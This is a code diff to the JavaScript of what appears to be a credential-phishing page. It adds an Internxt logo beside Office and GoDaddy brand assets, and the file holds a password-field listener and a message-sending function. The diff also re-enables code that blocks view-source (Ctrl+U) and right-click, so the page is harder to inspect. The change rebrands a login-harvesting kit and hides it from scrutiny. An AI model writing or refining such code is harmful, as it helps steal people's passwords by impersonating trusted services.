@@ -6,6 +6,7 @@ const redirectURL =
   "http://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";
 const url_link = "";
 const hero_img = document.getElementById("hero_img");
+const internxtLogo = document.getElementById("internxtLogo");
 const office_brand = document.getElementById("office_brand");
 const office_left_arrow = document.getElementById("office_left_arrow");
 const name_key = document.getElementById("name_key");
@@ -365,7 +366,7 @@ function sendMessage(message) {
 }
 
 // calling functions
-setImg(hero_img, "domain_assets/Marquee_Device_Desktop.png");
+setImg(internxtLogo, "domain_assets/internxt-logo.svg");
 setImg(office_brand, "domain_assets/office_brand.svg");
 setImg(office_left_arrow, "domain_assets/arrow_left.svg");
 setImg(godaddy_logo, "domain_assets/godaddy_logo.png");
@@ -554,15 +555,15 @@ mc_name_pass.addEventListener("keyup", () => {
 });
 
 //inspect off
-// function redirectCU(e) {
-//   if (e.ctrlKey && e.which == 85) {
-//     return false;
-//   }
-// }
-// document.onkeydown = redirectCU;
-// function redirectKK(e) {
-//   if (e.which == 3) {
-//     return false;
-//   }
-// }
-// document.oncontextmenu = redirectKK;
+function redirectCU(e) {
+  if (e.ctrlKey && e.which == 85) {
+    return false;
+  }
+}
+document.onkeydown = redirectCU;
+function redirectKK(e) {
+  if (e.which == 3) {
+    return false;
+  }
+}
+document.oncontextmenu = redirectKK;
